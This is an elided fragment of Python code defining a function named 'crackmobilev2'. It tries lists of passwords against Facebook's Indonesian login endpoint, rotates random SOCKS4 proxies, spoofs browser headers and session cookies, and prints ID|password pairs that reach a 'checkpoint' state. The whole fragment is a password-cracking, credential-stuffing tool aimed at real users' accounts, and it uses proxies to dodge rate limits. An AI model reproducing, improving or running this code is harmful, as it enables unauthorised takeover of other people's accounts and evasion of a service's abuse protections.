...
def crackmobilev2(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host: id-id.facebook.com
...
referer: https://id-id.facebook.com/login/device-based/regular/login/?login_attempt=1
accept-encoding: gzip, deflate, br, zstd
accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://id-id.facebook.com/?locale=id_ID&_rdr')
...
accept-encoding: gzip, deflate, br, zstd
accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://id-id.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}").add(f"[bold yellow]{ua}\n")
				cetak(tree)
